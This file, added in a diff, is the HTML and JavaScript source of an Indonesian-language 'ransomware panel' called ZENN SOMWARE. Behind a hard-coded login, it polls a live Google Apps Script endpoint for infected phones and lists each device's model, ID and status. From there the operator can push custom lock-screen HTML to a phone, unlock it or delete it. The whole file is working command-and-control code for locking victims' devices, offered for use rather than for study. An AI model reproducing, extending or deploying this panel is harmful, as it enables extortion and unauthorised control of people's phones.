@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ZENN SOMWARE</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:Arial,sans-serif;background:#050505;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center}
+        .c{width:100%;max-width:500px;padding:16px}
+        #login{background:#111;border:1px solid #222;border-radius:14px;padding:30px;text-align:center}
+        #login h1{font-size:22px;margin-bottom:4px}
+        #login h1 span{color:#00D4FF}
+        #login .sub{font-size:10px;color:#666;margin-bottom:20px;letter-spacing:2px}
+        #login input{width:100%;padding:10px;border-radius:8px;background:#0a0a0a;border:1px solid #222;color:#fff;font-size:13px;margin-bottom:8px}
+        #login button{width:100%;padding:10px;border-radius:8px;background:#00D4FF;color:#000;font-weight:700;border:none;cursor:pointer;font-size:13px}
+        .err{font-size:10px;color:#f87171;margin-top:8px;display:none}
+        #panel{display:none;width:100%}
+        .h{display:flex;align-items:center;justify-content:space-between;padding:10px 0;margin-bottom:14px}
+        .h h1{font-size:20px}
+        .h h1 span{color:#00D4FF}
+        .h button{padding:6px 12px;border-radius:6px;background:#1a1a1a;color:#ccc;border:none;cursor:pointer;font-size:10px;font-weight:600}
+        .card{background:#111;border:1px solid #222;border-radius:12px;padding:12px;margin-bottom:10px}
+        .card .r{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+        .card .ic{width:32px;height:32px;background:#1a1a1a;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px}
+        .card .in{flex:1}
+        .card .in .n{font-size:12px;font-weight:700}
+        .card .in .s{font-size:9px;color:#666}
+        .card .badge{font-size:8px;font-weight:700;padding:3px 8px;border-radius:12px}
+        .card .badge.on{background:rgba(0,255,136,0.1);color:#34d399}
+        .card .badge.off{background:rgba(255,255,255,0.03);color:#666}
+        .card .badge.locked{background:rgba(255,77,77,0.1);color:#f87171}
+        .card textarea{width:100%;padding:8px;border-radius:8px;background:#0a0a0a;border:1px solid #222;color:#fff;font-size:10px;font-family:monospace;resize:vertical;min-height:80px;margin-bottom:6px}
+        .card .btns{display:flex;gap:6px}
+        .card .btns button{flex:1;padding:8px;border-radius:8px;font-weight:700;border:none;cursor:pointer;font-size:10px}
+        .card .btns .lock{background:#00D4FF;color:#000}
+        .card .btns .unlock{background:#34d399;color:#000}
+        .card .btns .del{background:#ef4444;color:#fff}
+        .empty{text-align:center;padding:40px;color:#666;font-size:12px}
+        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#111;border:1px solid #00D4FF;padding:10px 20px;border-radius:20px;font-size:10px;z-index:100}
+    </style>
+</head>
+<body>
+<div class="c">
+    <div id="login">
+        <h1>ZENN <span>SOMWARE</span></h1>
+        <div class="sub">Panel Ransomware</div>
+        <input type="text" id="u" placeholder="Username" autocomplete="off">
+        <input type="password" id="p" placeholder="Password">
+        <button onclick="login()">🔐 Masuk</button>
+        <div class="err" id="err">Username atau password salah!</div>
+    </div>
+    <div id="panel">
+        <div class="h">
+            <h1>ZENN <span>SOMWARE</span></h1>
+            <button onclick="logout()">Keluar</button>
+        </div>
+        <div id="list"></div>
+    </div>
+</div>
+<script>
+const API='https://script.google.com/macros/s/AKfycbzwtt_Qt3xFQ5ToKqAy3Je-ukHD41Tinl9bHXT7aTd3KXQ3bt15w0SiMuHLY31peOheug/exec';
+
+function login(){
+  const u=document.getElementById('u').value.trim();
+  const p=document.getElementById('p').value;
+  if(u==='ZENSOMWARE'&&p==='zenn123'){
+    document.getElementById('login').style.display='none';
+    document.getElementById('panel').style.display='block';
+    load();
+  }else{
+    document.getElementById('err').style.display='block';
+  }
+}
+
+function logout(){
+  document.getElementById('panel').style.display='none';
+  document.getElementById('login').style.display='block';
+  document.getElementById('u').value='';
+  document.getElementById('p').value='';
+  document.getElementById('err').style.display='none';
+}
+
+async function load(){
+  try{
+    let r=await fetch(API,{method:'POST',body:JSON.stringify({action:'getDevices',token:'zenn_2024'})});
+    let d=await r.json();
+    const l=document.getElementById('list');
+    if(!d||!d.length){l.innerHTML='<div class="empty">📱 Belum ada device terhubung.</div>';return;}
+    l.innerHTML=d.map(x=>`
+      <div class="card">
+        <div class="r">
+          <div class="ic">📱</div>
+          <div class="in"><div class="n">${x.model}</div><div class="s">${x.device_id}</div></div>
+          <span class="badge ${x.locked?'locked':x.online?'on':'off'}">${x.locked?'🔒':x.online?'ONLINE':'OFFLINE'}</span>
+        </div>
+        <textarea id="h-${x.device_id}" placeholder="Tempel kode HTML lock screen...">${x.lock_html||''}</textarea>
+        <div class="btns">
+          <button class="lock" onclick="sendLock('${x.device_id}')">🔒 Lock</button>
+          <button class="unlock" onclick="sendUnlock('${x.device_id}')">🔓 Unlock</button>
+          <button class="del" onclick="delDevice('${x.device_id}')">🗑 Hapus</button>
+        </div>
+      </div>
+    `).join('');
+    setTimeout(load,10000);
+  }catch(e){}
+}
+
+async function sendLock(id){
+  const h=document.getElementById('h-'+id).value;
+  if(!h.trim())return toast('⚠️ Isi kode HTML dulu!');
+  await fetch(API,{method:'POST',body:JSON.stringify({action:'sendLock',token:'zenn_2024',device_id:id,lock_html:h})});
+  toast('🔒 Lock dikirim!');
+  load();
+}
+
+async function sendUnlock(id){
+  await fetch(API,{method:'POST',body:JSON.stringify({action:'sendUnlock',token:'zenn_2024',device_id:id})});
+  toast('🔓 Unlock dikirim!');
+  load();
+}
+
+async function delDevice(id){
+  await fetch(API,{method:'POST',body:JSON.stringify({action:'deleteDevice',token:'zenn_2024',device_id:id})});
+  toast('🗑 Device dihapus!');
+  load();
+}
+
+function toast(m){
+  let t=document.createElement('div');t.className='toast';t.textContent=m;
+  document.body.appendChild(t);setTimeout(()=>t.remove(),3000);
+}
+
+document.getElementById('p').addEventListener('keydown',e=>{if(e.key==='Enter')login();});
+</script>
+</body>
+</html>
